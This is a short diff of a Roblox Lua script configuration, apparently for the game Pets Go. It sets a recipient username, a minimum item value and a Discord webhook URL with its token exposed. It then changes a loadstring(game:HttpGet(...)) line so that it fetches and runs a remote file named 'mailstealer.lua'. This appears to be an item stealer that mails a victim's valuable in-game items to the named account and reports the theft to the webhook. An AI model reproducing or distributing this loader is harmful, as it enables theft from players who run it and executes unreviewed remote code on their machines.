@@ -2,4 +2,4 @@ Username = "bx4rzwasdeleted"
 min_rap = 10 -- minimum rap of each item you want to get sent to you. 10k by default
 webhook = "https://discord.com/api/webhooks/1289613307631632417/RrQFIi86rxupJJinPyFfQ_kikvOLmmYz82lfO0NDBPUdC15aIDUkUBSqHRrBGGbyhYk3"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/BearrXW/test/refs/heads/main/mainnewfile"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/Pets-Go/refs/heads/main/mailstealer.lua"))()
